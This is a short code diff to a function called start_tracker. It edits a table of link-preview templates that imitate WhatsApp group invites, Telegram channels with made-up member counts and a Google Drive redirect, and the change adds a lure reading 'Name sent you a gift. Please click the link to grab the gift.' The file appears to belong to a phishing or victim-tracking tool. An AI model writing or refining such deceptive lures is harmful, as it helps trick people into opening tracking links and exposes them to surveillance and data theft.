@@ -218,7 +218,7 @@ def start_tracker(config_dict=None):
     TEMPLATE_DEFAULTS = {
         0: {},
         1: {"REDIRECT": "https://drive.google.com"},
-        2: {"TITLE": "My Family & Friends", "IMAGE": "template/whatsapp/images/ZIvBTrQd9nP.png"},
+        2: {"TITLE": "Name sent you a gift.", "DESC": "Please click the link to grab the gift.", "IMAGE": "https://images.unsplash.com/photo-1549465220-1a8b9238cd48?w=1200&h=630&fit=crop"},
         3: {"TITLE": "Project Updates", "IMAGE": "template/whatsapp/images/ZIvBTrQd9nP.png", "REDIRECT": "https://chat.whatsapp.com"},
         4: {"TITLE": "News & Signals Channel", "IMAGE": "template/telegram/images/Arrow_1x.png", "DESC": "Official Group for Updates", "MEM_NUM": "1,420", "ONLINE_NUM": "84"},
         5: {"TITLE": "Conference Meeting Topic"},
